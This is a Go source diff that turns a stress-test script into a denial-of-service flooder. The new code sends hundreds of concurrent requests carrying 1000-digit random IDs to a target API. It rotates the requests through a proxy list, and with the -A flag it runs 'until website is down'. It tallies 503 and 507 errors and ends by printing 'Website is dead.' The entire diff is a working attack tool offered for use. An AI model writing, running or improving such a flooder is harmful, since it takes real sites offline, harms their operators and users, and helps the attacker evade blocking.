@@ -2,136 +2,145 @@ package main
 
 import (
 	"bufio"
-	"encoding/json"
 	"flag"
 	"fmt"
 	"math/rand"
 	"net/http"
 	"net/url"
 	"os"
+	"strings"
 	"sync"
 	"time"
 )
 
 var (
 	apiURL    string
-	useFile   bool
 	attack    bool
-	enableLog bool
-	proxyURL  string
+	useNuke   bool
+	verbose   bool
+	proxyFile string
 	threads   int
-	userIDs   []string
-	logMutex  sync.Mutex
-	stopTest  bool
+	idLength  int
+	proxies   []string
 	client    *http.Client
+	stats     struct {
+		totalRequests int
+		status503     int
+		status507     int
+		proxyCount    int
+		totalTime     time.Duration
+	}
+	mutex sync.Mutex
 )
-
-type LogEntry struct {
-	ID        string `json:"id"`
-	Status    int    `json:"status"`
-	TimeMS    int64  `json:"time_ms"`
-	Timestamp string `json:"timestamp"`
-}
 
 func init() {
 	flag.StringVar(&apiURL, "url", "", "API URL (required)")
-	flag.BoolVar(&useFile, "usefile", false, "Use users.txt for user IDs")
 	flag.BoolVar(&attack, "A", false, "Run until website is down")
-	flag.BoolVar(&enableLog, "log", false, "Enable logging to stress_test.log")
-	flag.StringVar(&proxyURL, "proxy", "", "Proxy URL (optional, e.g., http://127.0.0.1:8080)")
-	flag.IntVar(&threads, "threads", 50, "Number of concurrent requests")
+	flag.BoolVar(&useNuke, "nuke", false, "Send huge ID in request")
+	flag.BoolVar(&verbose, "v", false, "Show all requests")
+	flag.StringVar(&proxyFile, "proxy", "", "Proxy list file (optional)")
+	flag.IntVar(&threads, "threads", 500, "Number of concurrent requests")
+	flag.IntVar(&idLength, "idlen", 1000, "Length of the huge ID")
 	flag.Parse()
 
 	if apiURL == "" {
-		fmt.Println("Usage: go run main.go -url=https://website/api/v1.php?id= [-usefile] [-A] [-log] [-proxy=http://127.0.0.1:8080] [-threads=50]")
+		fmt.Println("Usage: go run main.go -url=https://site/api/v1.php?id= [-A] [-nuke] [-proxy=proxies.txt] [-threads=5000] [-idlen=1000] [-v]")
 		os.Exit(1)
 	}
 
-	if useFile {
-		loadUserIDs("users.txt")
-	}
-
+	loadProxies()
 	setupHTTPClient()
 }
 
-// Load user IDs from users.txt
-func loadUserIDs(filename string) {
-	file, err := os.Open(filename)
+// Load proxies from file
+func loadProxies() {
+	if proxyFile == "" {
+		return
+	}
+	file, err := os.Open(proxyFile)
 	if err != nil {
-		fmt.Println("Error opening users.txt:", err)
+		fmt.Println("Error opening proxies.txt:", err)
 		os.Exit(1)
 	}
 	defer file.Close()
 
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
-		userIDs = append(userIDs, scanner.Text())
+		proxies = append(proxies, scanner.Text())
 	}
+	stats.proxyCount = len(proxies)
 }
 
-// Generate a random Telegram user ID
-func randomUserID() string {
-	return fmt.Sprintf("%d", rand.Intn(9999999999-1000000000)+1000000000)
-}
-
-// Setup HTTP client with optional proxy
+// Setup HTTP client with proxy support
 func setupHTTPClient() {
-	transport := &http.Transport{}
-	if proxyURL != "" {
-		proxy, err := url.Parse(proxyURL)
-		if err != nil {
-			fmt.Println("Invalid proxy URL:", err)
-			os.Exit(1)
-		}
-		transport.Proxy = http.ProxyURL(proxy)
-	}
-	client = &http.Client{Transport: transport}
+	client = &http.Client{}
 }
 
-// Perform API request and log response
-func makeRequest(id string, wg *sync.WaitGroup) {
+// Generate a **huge random ID** of `idLength` digits
+func generateHugeID() string {
+	var sb strings.Builder
+	for i := 0; i < idLength; i++ {
+		sb.WriteString(fmt.Sprintf("%d", rand.Intn(10))) // Random digit (0-9)
+	}
+	return sb.String()
+}
+
+// Make API request
+func makeRequest(wg *sync.WaitGroup) {
 	defer wg.Done()
 
 	start := time.Now()
-	resp, err := client.Get(apiURL + id)
-	duration := time.Since(start).Milliseconds()
+	requestURL := fmt.Sprintf("%s%s", apiURL, generateHugeID())
 
-	entry := LogEntry{
-		ID:        id,
-		TimeMS:    duration,
-		Timestamp: time.Now().UTC().Format(time.RFC3339),
+	req, err := http.NewRequest("GET", requestURL, nil)
+	if err != nil {
+		return
 	}
 
-	if err != nil {
-		entry.Status = 0 // Connection error
-		stopTest = true  // Mark website as down
-	} else {
-		entry.Status = resp.StatusCode
-		resp.Body.Close()
-		if resp.StatusCode >= 500 {
-			stopTest = true // Server error means site is failing
+	// Use a proxy if available
+	if len(proxies) > 0 {
+		proxy, err := url.Parse(proxies[rand.Intn(len(proxies))])
+		if err == nil {
+			client.Transport = &http.Transport{Proxy: http.ProxyURL(proxy)}
 		}
 	}
 
-	if enableLog {
-		logResponse(entry)
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+
+	responseTime := time.Since(start)
+
+	mutex.Lock()
+	stats.totalRequests++
+	stats.totalTime += responseTime
+	if resp.StatusCode == 503 {
+		stats.status503++
+	} else if resp.StatusCode == 507 {
+		stats.status507++
+	}
+	mutex.Unlock()
+
+	if verbose {
+		fmt.Printf("[🔹] Request: %s | Status: %d | Time: %v\n", requestURL, resp.StatusCode, responseTime)
 	}
 }
 
-// Log the response to a file
-func logResponse(entry LogEntry) {
-	logMutex.Lock()
-	defer logMutex.Unlock()
-
-	file, err := os.OpenFile("stress_test.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		fmt.Println("Error opening log file:", err)
-		return
+// Print status every 10,000 requests
+func printStats() {
+	for {
+		time.Sleep(5 * time.Second)
+		mutex.Lock()
+		avgTime := time.Duration(0)
+		if stats.totalRequests > 0 {
+			avgTime = stats.totalTime / time.Duration(stats.totalRequests)
+		}
+		fmt.Printf("\n🔥 Requests Sent: %d | 503 Errors: %d | 507 Errors: %d | Proxies Used: %d | Avg Response Time: %v\n",
+			stats.totalRequests, stats.status503, stats.status507, stats.proxyCount, avgTime)
+		mutex.Unlock()
 	}
-	defer file.Close()
-
-	jsonData, _ := json.Marshal(entry)
-	file.WriteString(string(jsonData) + "\n")
 }
 
 func main() {
@@ -140,24 +149,17 @@ func main() {
 	var wg sync.WaitGroup
 	semaphore := make(chan struct{}, threads)
 
-	for attack || !stopTest { // Run until website stops
+	go printStats() // Start status printing in the background
+
+	for attack {
 		semaphore <- struct{}{}
-
 		wg.Add(1)
-		var id string
-
-		if useFile && len(userIDs) > 0 {
-			id = userIDs[rand.Intn(len(userIDs))] // Pick from users.txt
-		} else {
-			id = randomUserID() // Generate a random ID
-		}
-
-		go func(id string) {
-			makeRequest(id, &wg)
+		go func() {
+			makeRequest(&wg)
 			<-semaphore
-		}(id)
+		}()
 	}
 
 	wg.Wait()
-	fmt.Println("Website is down. Stress test stopped.")
+	fmt.Println("🔥 Website is dead.")
 }
